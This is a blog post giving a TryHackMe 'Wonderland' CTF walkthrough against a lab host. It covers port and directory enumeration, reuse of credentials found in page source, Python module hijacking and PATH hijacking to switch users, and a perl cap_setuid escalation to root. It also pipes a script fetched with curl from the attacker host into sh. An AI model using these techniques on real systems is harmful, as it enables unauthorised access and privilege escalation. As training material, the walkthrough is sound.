<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <script async src="https://www.googletagmanager.com/gtag/js?id=UA-175469707-1"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-175469707-1'); </script><title>Tryhackme - Wonderland | Rhovelionz</title><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Tryhackme - Wonderland" /><meta name="author" content="Rhovelionz" /><meta property="og:locale" content="en_US" /><meta name="description" content="Any actions and or activities related to the material contained within this Website is solely your responsibility. This site contains materials that can be potentially damaging or dangerous. If you do not fully understand something on this site, then GO OUT OF HERE! Refer to the laws in your province/country before accessing, using, or in any other way utilizing these materials.These materials are for educational and research purposes only." /><meta property="og:description" content="Any actions and or activities related to the material contained within this Website is solely your responsibility. This site contains materials that can be potentially damaging or dangerous. If you do not fully understand something on this site, then GO OUT OF HERE! Refer to the laws in your province/country before accessing, using, or in any other way utilizing these materials.These materials are for educational and research purposes only." /><link rel="canonical" href="http://localhost:4000/posts/Wonderland/" /><meta property="og:url" content="http://localhost:4000/posts/Wonderland/" /><meta property="og:site_name" content="Rhovelionz" /><meta property="og:image" content="http://localhost:4000/assets/img/Post/wonderland.jpeg" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-10-05T07:20:00+07:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="http://localhost:4000/assets/img/Post/wonderland.jpeg" /><meta property="twitter:title" content="Tryhackme - Wonderland" /><meta name="twitter:site" content="@radivanh" /><meta name="twitter:creator" content="@Rhovelionz" /><meta name="google-site-verification" content="google-site-verification=eEOXNHtwQt24Bt3B-yrX7yp4uqtc0A-hWaVNSG5mL3E" /> <script type="application/ld+json"> {"url":"http://localhost:4000/posts/Wonderland/","headline":"Tryhackme - Wonderland","dateModified":"2022-10-05T07:20:00+07:00","datePublished":"2022-10-05T07:20:00+07:00","author":{"@type":"Person","name":"Rhovelionz"},"description":"Any actions and or activities related to the material contained within this Website is solely your responsibility. This site contains materials that can be potentially damaging or dangerous. If you do not fully understand something on this site, then GO OUT OF HERE! Refer to the laws in your province/country before accessing, using, or in any other way utilizing these materials.These materials are for educational and research purposes only.","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/Wonderland/"},"image":"http://localhost:4000/assets/img/Post/wonderland.jpeg","@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="//assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="//assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="//assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="//assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="//assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="//assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="//assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="//assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="//assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="//assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="//assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="//assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="//assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="//assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="//assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="//assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="//assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="//assets/img/favicons/manifest.json"><meta name='msapplication-config' content='//assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="//assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"> <!-- CSS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" async></script> <!-- JS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --> <script src="/assets/js/post.min.js" async></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="//" alt="avatar"> <img src="//assets/img/sample/anubis3b.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">Rhovelionz</a></div><div class="site-subtitle font-italic">Publish Writeup and Pentesting Report</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="//" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="//tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="//tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="//tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="//tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>WHOAMI</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://github.com/rhovelionz" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/radivanh" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:window.open('mailto:' + ['radivanhradivanh','gmail.com'].join('@'))" > <i class="fas fa-envelope"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="//"> Posts </a> </span> <span>Tryhackme - Wonderland</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Tryhackme - Wonderland</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Wed, Oct 5, 2022, 7:20 AM +0700" > Oct 5 <i class="unloaded">2022-10-05T07:20:00+07:00</i> </span> by <span class="author"> Rhovelionz </span></div></div><div class="post-content"> <img src="/assets/img/Post/wonderland.jpeg"><blockquote><p><strong>Any actions and or activities related to the material contained within this Website is solely your responsibility. This site contains materials that can be potentially damaging or dangerous. If you do not fully understand something on this site, then GO OUT OF HERE! Refer to the laws in your province/country before accessing, using, or in any other way utilizing these materials.These materials are for educational and research purposes only.</strong></p></blockquote><h2 id="summary"><strong><span style="color:#ff5555">Summary</span></strong></h2><hr /><ul><li>Fuzzing the rabbit directories</li><li>SSH into alice as low user</li><li>Escalate the user to Rabbit</li><li>Analyze the <code class="language-plaintext highlighter-rouge">teaParty</code> file in our machine</li><li>Abuse the /bin path to get hatter user</li><li>Use perl vulnerability to get root</li></ul><h2 id="port-scan"><strong><span style="color:#ff5555">Port scan</span></strong></h2><hr /><p>Port 22 running SSH and port 80 running golang http server</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="go">➜  wonderland nmap -sC -sV -p- -T4 10.10.113.230
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-06 03:16 UTC
Warning: 10.10.113.230 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.113.230
Host is up (0.34s latency).
Not shown: 65522 closed tcp ports (conn-refused)
PORT      STATE    SERVICE    VERSION
</span><span class="gp">22/tcp    open     ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
<span class="go">| ssh-hostkey:
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp    open     http       Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
2355/tcp  filtered psdbserver
7599/tcp  filtered unknown
12720/tcp filtered unknown
21834/tcp filtered unknown
33967/tcp filtered unknown
35195/tcp filtered unknown
38367/tcp filtered unknown
41404/tcp filtered unknown
44146/tcp filtered unknown
51048/tcp filtered unknown
57034/tcp filtered unknown
</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
<span class="go">
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1176.64 seconds
</span></pre></table></code></div></div><h2 id="website"><strong><span style="color:#ff5555">Website</span></strong></h2><hr /><p>Nothing interesting on the website</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/images/thm/wonderland/website.png" alt="" /></p><h2 id="enumeration"><strong><span style="color:#ff5555">Enumeration</span></strong></h2><hr /><p>Running Gobuster against the website to find directories that might lead us</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="go">➜  wonderland gobuster dir --url http://10.10.113.230/ --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.113.230/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/10/06 02:50:26 Starting gobuster in directory enumeration mode
===============================================================
</span><span class="gp">/img                  (Status: 301) [Size: 0] [--&gt;</span><span class="w"> </span>img/]
<span class="gp">/r                    (Status: 301) [Size: 0] [--&gt;</span><span class="w"> </span>r/]
<span class="go">
</span></pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">/r </code>caught my attention, by checking it out, we find an image.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/images/thm/wonderland/keepgoing.png" alt="" /></p><p>Running gobuster again to check subdirectories in <code class="language-plaintext highlighter-rouge">/r</code>.</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="go">➜  wonderland gobuster dir --url http://10.10.113.230/r/ --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.113.230/r/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/10/06 03:17:39 Starting gobuster in directory enumeration mode
===============================================================
</span><span class="gp">/a                    (Status: 301) [Size: 0] [--&gt;</span><span class="w"> </span>a/]
<span class="go">Progress: 2323 / 220562 (1.05%)                      ^C
[!] Keyboard interrupt detected, terminating.

===============================================================
2022/10/06 03:19:03 Finished
===============================================================
</span></pre></table></code></div></div><p>Found <code class="language-plaintext highlighter-rouge">/a</code> subdirectory, by guessing it’s going to be <code class="language-plaintext highlighter-rouge">/r/a/b/b/i/t</code>, to validate it let’s check on the browser.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/images/thm/wonderland/rabbit1.png" alt="" /></p><p>By viewing the source, we found credential for alice which might be useful for ssh since the box has port 22 opened.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/images/thm/wonderland/sourcecode.png" alt="" /></p><h2 id="ssh-as-low-user"><strong><span style="color:#ff5555">SSH as low user</span></strong></h2><hr /><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="gp">➜  wonderland ssh alice@$</span>IP
<span class="go">The authenticity of host '10.10.113.230 (10.10.113.230)' can't be established.
ED25519 key fingerprint is SHA256:Q8PPqQyrfXMAZkq45693yD4CmWAYp5GOINbxYqTRedo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.113.230' (ED25519) to the list of known hosts.
alice@10.10.113.230's password:
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Oct  6 03:20:22 UTC 2022

  System load:  0.09               Processes:           83
  Usage of /:   18.9% of 19.56GB   Users logged in:     0
  Memory usage: 29%                IP address for eth0: 10.10.113.230
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Mon May 25 16:37:21 2020 from 192.168.170.1
</span></pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">sudo -l</code> shows something can be useful, user rabbit able to execute python3 and walrus_and_the_carpenter.py. I successfully logged in with the credentials. In the home directory of alice was a python script and a “root.txt” file. Obviously i didn’t have access to read the root.txt.</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="gp">alice@wonderland:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="go">[sudo] password for alice:
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
</span><span class="gp">alice@wonderland:~$</span><span class="w">
</span></pre></table></code></div></div><p>walrus_and_the_carpenter.py can be exploited because it imports <code class="language-plaintext highlighter-rouge">random</code>.</p><p>So I decided to spawn shell by creating file called <code class="language-plaintext highlighter-rouge">random.py</code> in the same directory.</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">alice@wonderland:~$</span><span class="w"> </span><span class="nb">echo</span> <span class="s1">'import os'</span> <span class="o">&gt;</span> random.py
<span class="gp">alice@wonderland:~$</span><span class="w"> </span><span class="nb">echo</span> <span class="s1">'os.system("/bin/sh")'</span> <span class="o">&gt;&gt;</span> random.py
</pre></table></code></div></div><p>Execute the file with /usr/bin/python3.6.</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">alice@wonderland:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-u</span> rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
</pre></table></code></div></div><p>And we got <code class="language-plaintext highlighter-rouge">Rabbit</code>.</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">whoami</span>
<span class="go">rabbit
</span></pre></table></code></div></div><h2 id="privilege-escalation"><strong><span style="color:#ff5555">Privilege Escalation</span></strong></h2><hr /><p>There is a binary file in <code class="language-plaintext highlighter-rouge">/home/rabbit</code> that called teaParty</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">cd</span> /home
<span class="gp">$</span><span class="w"> </span><span class="nb">cd </span>rabbit
<span class="gp">$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
<span class="go">total 40
drwxr-x--- 2 rabbit rabbit  4096 May 25  2020 .
drwxr-xr-x 6 root   root    4096 May 25  2020 ..
</span><span class="gp">lrwxrwxrwx 1 root   root       9 May 25  2020 .bash_history -&gt;</span><span class="w"> </span>/dev/null
<span class="go">-rw-r--r-- 1 rabbit rabbit   220 May 25  2020 .bash_logout
-rw-r--r-- 1 rabbit rabbit  3771 May 25  2020 .bashrc
-rw-r--r-- 1 rabbit rabbit   807 May 25  2020 .profile
-rwsr-sr-x 1 root   root   16816 May 25  2020 teaParty
</span></pre></table></code></div></div><p>Run the Binary and we receive a message from it</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>./teaParty
<span class="go">Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Thu, 06 Oct 2022 04:26:09 +0000
Ask very nicely, and I will give you some tea while you wait for him

Segmentation fault (core dumped
</span></pre></table></code></div></div><p>The binary <code class="language-plaintext highlighter-rouge">teaParty</code> has SUID permissions, we cannot run strings in this machine, so I decided to transfer it to <code class="language-plaintext highlighter-rouge">/dev/shm</code> and send it to my machine.</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>python3 <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
<span class="gp">rabbit@wonderland:/home/rabbit$</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">teaParty

</span><span class="gp">rabbit@wonderland:/home/rabbit$</span><span class="w"> </span><span class="nb">cp </span>teaParty /dev/shm/
<span class="go">
</span><span class="gp">➜  wonderland scp -r alice@$</span>IP:/dev/shm/teaParty teaParty
<span class="go">alice@10.10.113.230's password:
teaParty                                                             100%   16KB  16.3KB/s   00:01
</span></pre></table></code></div></div><p>When I run strings against the file to analyze the binary, I found 1 line that mentioned <code class="language-plaintext highlighter-rouge">date</code> being called but it doesn’t specify the path to it.</p><p>Checking the path</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">rabbit@wonderland:/home/rabbit$</span><span class="w"> </span><span class="nb">echo</span> <span class="nv">$PATH</span>
<span class="go">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
</span></pre></table></code></div></div><p>As we can see there are multiple <code class="language-plaintext highlighter-rouge">/bin</code> at the end, if we created a file called <code class="language-plaintext highlighter-rouge">date</code>, the system will find that file before getting to <code class="language-plaintext highlighter-rouge">/bin</code>, and we need to make sure that system will call our date file.</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="gp">rabbit@wonderland:/home/rabbit$</span><span class="w"> </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
<span class="gp">rabbit@wonderland:/home/rabbit$</span><span class="w"> </span><span class="nb">echo</span> <span class="s1">'#!/bin/bash'</span> <span class="o">&gt;</span> /tmp/date
<span class="gp">rabbit@wonderland:/home/rabbit$</span><span class="w"> </span><span class="nb">echo</span> <span class="s1">'/bin/bash'</span> <span class="o">&gt;&gt;</span> /tmp/date
<span class="gp">rabbit@wonderland:/home/rabbit$</span><span class="w"> </span><span class="nb">chmod </span>777 /tmp/date
</pre></table></code></div></div><p>And run the file again</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="gp">rabbit@wonderland:/home/rabbit$</span><span class="w"> </span>./teaParty
<span class="go">Welcome to the tea party!
The Mad Hatter will be here soon.
</span><span class="gp">Probably by hatter@wonderland:/home/rabbit$</span><span class="w"> </span><span class="nb">id</span>
<span class="go">uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit)
</span><span class="gp">hatter@wonderland:/home/rabbit$</span><span class="w"> </span><span class="nb">whoami</span>
<span class="go">hatter
</span></pre></table></code></div></div><p>There is only 1 file in <code class="language-plaintext highlighter-rouge">hatter</code> directory, a credential for ssh I believe.</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="gp">hatter@wonderland:/home/rabbit$</span><span class="w"> </span><span class="nb">cd</span> /home/hatter
<span class="gp">hatter@wonderland:/home/hatter$</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">password.txt
</span><span class="gp">hatter@wonderland:/home/hatter$</span><span class="w"> </span><span class="nb">cat </span>password.txt
<span class="go">*****************************************
</span></pre></table></code></div></div><h2 id="road-to-root"><strong><span style="color:#ff5555">Road to ROOT</span></strong></h2><hr /><p>Ssh as hatter with password from the text file.</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">➜  wonderland ssh hatter@$</span>IP
<span class="go">hatter@10.10.113.230's password:
</span></pre></table></code></div></div><p>Run the <code class="language-plaintext highlighter-rouge">linpeas.sh</code> as hatter to find vulnerabilities inside this box.</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="go">➜  linpeas sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.113.230 - - [06/Oct/2022 03:47:32] "GET /linpeas.sh HTTP/1.1" 200 -

</span><span class="gp">hatter@wonderland:~$</span><span class="w"> </span>curl 10.17.69.235/linpeas.sh | sh
<span class="go">
</span></pre></table></code></div></div><p>I found setuid binary capabilities from linpeas.</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="go">Files with capabilities (limited to 50):
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
</span></pre></table></code></div></div><p>This means any id or uid of 0 gets special privileges running processes, it will skip the restriction when the system found id or uid with 0.</p><p>I searched how to bypass this thing and found GTFOBINS has solution regarding <code class="language-plaintext highlighter-rouge">/usr/bin/perl</code> To elevate our privileges to root, we need to execute this command as hatter.</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">hatter@wonderland:~$</span><span class="w"> </span>/usr/bin/perl <span class="nt">-e</span> <span class="s1">'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'</span>
<span class="gp">#</span><span class="w"> </span><span class="nb">id</span>
<span class="go">uid=0(root) gid=1003(hatter) groups=1003(hatter)
</span></pre></table></code></div></div><p>Find the user.txt in <code class="language-plaintext highlighter-rouge">/root</code> directory</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="gp">#</span><span class="w"> </span><span class="nb">cd</span> /root
<span class="gp">#</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">user.txt
</span><span class="gp">#</span><span class="w"> </span><span class="nb">cat </span>user.txt
<span class="go">thm****************************
</span></pre></table></code></div></div><p>And get root.txt in <code class="language-plaintext highlighter-rouge">/home/alice</code></p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="gp">#</span><span class="w"> </span><span class="nb">cd</span> /home
<span class="gp">#</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">alice  hatter  rabbit  tryhackme
</span><span class="gp">#</span><span class="w"> </span><span class="nb">cd </span>alice
<span class="gp">#</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">random.py  root.txt  walrus_and_the_carpenter.py
</span><span class="gp">#</span><span class="w"> </span><span class="nb">cat </span>root.txt
<span class="go">thm********************************
</span><span class="gp">#</span><span class="w">
